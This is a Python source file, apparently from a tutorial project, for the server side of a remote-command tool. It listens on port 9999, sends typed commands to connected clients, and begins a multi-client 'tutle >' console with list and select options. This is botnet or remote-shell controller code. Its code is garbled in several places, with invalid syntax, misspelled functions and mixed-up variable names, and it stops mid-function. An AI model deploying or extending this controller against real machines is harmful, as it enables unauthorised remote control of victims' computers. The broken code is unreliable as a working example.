import socket
import threading
from queue import Queue
import sys

NUMBER_OF_THREADS = 2
JOB_NUMBER[1,2]
queue = Queue()
all_connections = []
all_addresses = []


#create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('socket creation error '+str(msg))

# bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: "+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print('socket binding error: '+str(msg))
        print('retrying...')
        socket_bind()

# establishing a connection with client (socket must be listening for them)

def socket_accept():
    conn,address = s.accept()
    print("Connection has been established | " +"IP "+address[0]+" | Port "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd =input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()

# accept connections from multiple clients and save to list

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    while 1:
        try:
            conn,address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print('\nConnection has been established: ' +address[0])
        except:
            print('error accepting connections')

# Interactive prompt for sending commands remotely
def start_tutle():
    while 1:
        cmd = imput('tutle >')
        if cmd=='list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('Command not recognised')

#Displays all current connections
def list_connections():
    results =''

    for i,cnn in enumerate(all_connections):
        try:
            conn.send(str,encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
